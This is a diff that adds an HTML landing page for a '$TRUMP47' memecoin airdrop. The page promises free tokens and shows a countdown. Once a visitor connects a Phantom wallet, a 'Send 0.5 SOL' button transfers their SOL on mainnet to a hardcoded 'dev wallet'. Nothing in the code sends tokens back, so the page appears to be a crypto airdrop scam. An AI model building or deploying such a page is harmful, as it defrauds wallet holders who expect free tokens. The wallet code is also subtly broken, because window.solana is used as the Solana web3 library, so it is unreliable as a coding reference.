@@ -1,0 +1,374 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>RETRUMPICAN ($TRUMP47) Face-Off</title>
+    
+    <!-- TailwindCSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&family=Oswald:wght@700&family=Orbitron:wght@700&display=swap" rel="stylesheet"/>
+
+    <!-- Font Awesome Icons -->
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+
+    <!-- Solana Web3 -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.30.2/solana-web3.min.js"></script>
+
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #FF8C00, #FF4500);
+            background-attachment: fixed;
+            background-size: cover;
+            color: white;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .main-header {
+            text-align: center;
+            font-size: 5rem;
+            font-family: 'Oswald', sans-serif;
+            font-weight: bold;
+            margin-top: 20px;
+            text-transform: uppercase;
+            color: #FFD700; /* Gold color for the header */
+            background: rgba(0, 0, 0, 0.7); /* Dark shade for the header */
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .versus-container {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            text-align: center;
+            padding: 50px;
+        }
+
+        .icon-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40%;
+        }
+
+        .icon-container img {
+            width: 100%;
+            max-width: 350px;
+            height: auto;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .icon-container:first-child img {
+            max-width: 450px; /* Increase the size of the left icon */
+        }
+
+        .content {
+            text-align: center;
+            padding: 30px 20px;
+            margin-top: -50px;
+        }
+
+        h1, h2, h3 {
+            font-family: 'Oswald', sans-serif;
+        }
+
+        footer {
+            background: rgba(0, 0, 0, 0.6);
+            color: white;
+            text-align: center;
+            padding: 20px;
+            margin-top: auto;
+        }
+
+        @media (max-width: 768px) {
+            .main-header {
+                font-size: 3rem;
+            }
+
+            .versus-container {
+                flex-direction: column;
+                padding: 20px;
+            }
+
+            .icon-container {
+                width: 80%;
+                margin-bottom: 20px;
+            }
+
+            .content {
+                margin-top: 0;
+            }
+
+            h2 {
+                font-size: 2rem;
+            }
+
+            h3 {
+                font-size: 1.5rem;
+            }
+
+            p, ul {
+                font-size: 1rem;
+            }
+
+            button {
+                font-size: 1rem;
+                padding: 10px 20px;
+            }
+        }
+
+        /* Animation Styles */
+        .animated-icon {
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .animated-icon:hover {
+            transform: scale(1.2);
+        }
+
+        .rotating-icon {
+            animation: rotate 5s linear infinite;
+        }
+
+        @keyframes rotate {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Countdown Styles */
+        .countdown {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #FFD700; /* Gold color for the countdown */
+            background: rgba(0, 0, 0, 0.7); /* Dark shade for the countdown */
+            padding: 10px;
+            border-radius: 10px;
+            display: inline-block;
+            font-family: 'Orbitron', sans-serif; /* Different font for the countdown */
+            text-transform: uppercase; /* Make letters uppercase */
+        }
+
+        /* Button Styles */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 10px 20px;
+            font-size: 1.25rem;
+            font-weight: bold;
+            border-radius: 25px;
+            transition: transform 0.3s ease-in-out;
+        }
+
+        .btn:hover {
+            transform: scale(1.05);
+        }
+
+        .btn-connect {
+            background: linear-gradient(to right, #4A90E2, #9013FE);
+            color: white;
+        }
+
+        .btn-dex {
+            background: black;
+            color: white;
+        }
+
+        .btn-dex i {
+            margin-right: 10px;
+        }
+    </style>
+
+<script>
+    // ✅ Fix: Define solanaWeb3 globally to avoid errors
+    const solanaWeb3 = window.solana; // ✅ Fix: Use `window.solana` directly
+
+
+    let provider, web3, accounts;
+    let connectedWallets = []; // Store list of connected addresses
+
+    // ✅ Function to Connect Wallet (Works with Phantom, Solflare, etc.)
+    async function connectWallet() {
+        if (!window.solana || !window.solana.isPhantom) {
+            alert("Please install Phantom Wallet to continue.");
+            return;
+        }
+
+        try {
+            // Request wallet connection
+            const response = await window.solana.connect();
+            const walletAddress = response.publicKey.toString();
+            
+            // Show wallet address on the page
+            document.getElementById("wallet-address").innerText = `Connected Wallet: ${walletAddress}`;
+
+            // Save wallet address if not already added
+            if (!connectedWallets.includes(walletAddress)) {
+                connectedWallets.push(walletAddress);
+            }
+
+            console.log("Connected Wallet:", walletAddress);
+            console.log("List of Connected Wallets:", connectedWallets);
+
+            // Show "Send SOL" button after wallet is connected
+            document.getElementById("send-sol-section").style.display = "block";
+        } catch (error) {
+            console.error("Wallet connection failed:", error);
+            alert("Wallet connection failed. Please try again.");
+        }
+    }
+
+    // ✅ Function to Send 0.5 SOL to Dev Wallet
+    async function sendTokens(amount) {
+    if (!window.solana || !window.solana.isPhantom) {
+        alert("Please connect your wallet first.");
+        return;
+    }
+
+    try {
+        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
+        const senderWallet = window.solana.publicKey;
+        const receiverWallet = new solanaWeb3.PublicKey("5sEU3zpRWxo7hxbrPeJuUrpB5gbaVxZT6dTvPfbtTm97"); // Your Dev Wallet
+
+        // Check User's Balance
+        const senderBalance = await connection.getBalance(senderWallet);
+        if (senderBalance < solanaWeb3.LAMPORTS_PER_SOL * amount) {
+            alert("Not enough SOL to send transaction!");
+            return;
+        }
+
+        // Create Transaction
+        const transaction = new solanaWeb3.Transaction().add(
+            solanaWeb3.SystemProgram.transfer({
+                fromPubkey: senderWallet,
+                toPubkey: receiverWallet,
+                lamports: solanaWeb3.LAMPORTS_PER_SOL * amount, // Convert SOL amount
+            })
+        );
+
+        // Fetch latest blockhash
+        const { blockhash } = await connection.getLatestBlockhash();
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = senderWallet;
+
+        // Request Transaction Approval from User
+        const signedTransaction = await window.solana.signTransaction(transaction);
+        const signature = await connection.sendRawTransaction(signedTransaction.serialize());
+
+        alert(`✅ Transaction Successful!\n\nTransaction Signature: ${signature}`);
+        console.log("Transaction Successful:", signature);
+    } catch (error) {
+        console.error("Transaction Failed:", error);
+        alert("Transaction failed: " + error.message);
+    }
+}
+
+function updateCountdown() {
+    const countdownElement = document.getElementById("countdown");
+
+    if (!countdownElement) {
+        console.error("Countdown element not found.");
+        return;
+    }
+
+    const endDate = new Date("January 20, 2025 23:59:59").getTime();
+    const now = new Date().getTime();
+    const distance = endDate - now;
+
+    if (distance < 0) {
+        countdownElement.innerHTML = "Airdrop Ended";
+        return;
+    }
+
+    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+    countdownElement.innerHTML = `${days}D ${hours}H ${minutes}M ${seconds}S`;
+}
+
+// ✅ Ensure Countdown Starts After Page Loads
+window.onload = function () {
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+};
+
+</script>
+</head>
+<body>
+
+    <!-- BIG HEADER -->
+    <h1 class="main-header">RETRUMPICAN</h1>
+
+    <!-- Versus Layout with Two BIG Icons in Equal Containers -->
+    <div class="versus-container">
+        <div class="icon-container">
+            <img src="https://i.imgur.com/4Wmqlbh.png" alt="Left Icon: Image of an elephant with a stern expression" class="animated-icon">
+        </div>
+        <div class="icon-container">
+            <img src="https://i.imgur.com/w3eK7nk.png" alt="Right Icon: Image of a political figure with a confident expression" class="rotating-icon">
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="content">
+        <section class="text-center mb-6">
+            <h2 class="text-4xl font-bold mb-2">Claim Your Free $TRUMP47 Tokens!</h2>
+            <p class="text-xl mb-2">Airdrop ends on <strong>January 20, 2025</strong>. Don't miss out!</p>
+            <div class="countdown" id="countdown">Loading...</div>
+        </section>
+
+        <section class="text-center mb-6">
+            <h3 class="text-3xl font-bold mb-2">How to Qualify:</h3>
+            <ul class="text-xl text-center space-y-2">
+                <li>Like & Retweet our pinned tweet</li>
+                <li>Tag 3 friends on Twitter</li>
+                <li>Submit your Solana wallet address</li>
+            </ul>
+        </section>
+
+        <!-- Connect Wallet Button -->
+<section class="text-center mb-6">
+    <button class="btn btn-connect" onclick="connectWallet()">Connect Wallet</button>
+    <p id="wallet-address" class="mt-4 text-lg"></p>
+</section>
+
+<!-- Send SOL Button (Initially Hidden) -->
+<section class="text-center mb-6" id="send-sol-section" style="display: none;">
+    <button class="btn btn-connect" onclick="sendTokens(0.5)">Send 0.5 SOL</button>
+</section>
+
+        <section class="text-center mb-6">
+            <button class="btn btn-dex" onclick="window.open('https://dexscreener.com', '_blank')">
+                <i class="fas fa-chart-line"></i> DEX Screener
+            </button>
+        </section>
+
+        <section class="text-center mb-6">
+            <div class="flex justify-center space-x-4">
+                <a class="text-black" href="https://x.com/retrumpicant47?s=21&t=vyF4E046oowx5dkZvvBjvw" target="_blank"><i class="fab fa-twitter fa-2x"></i></a>
+                <a class="text-black" href="https://t.me/RETRUMPICAN" target="_blank"><i class="fab fa-telegram fa-2x"></i></a>
+            </div>
+        </section>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <small class="text-xl">Powered by RETRUMPICAN ($TRUMP47)</small>
+    </footer>
+
+</body>
+</html>
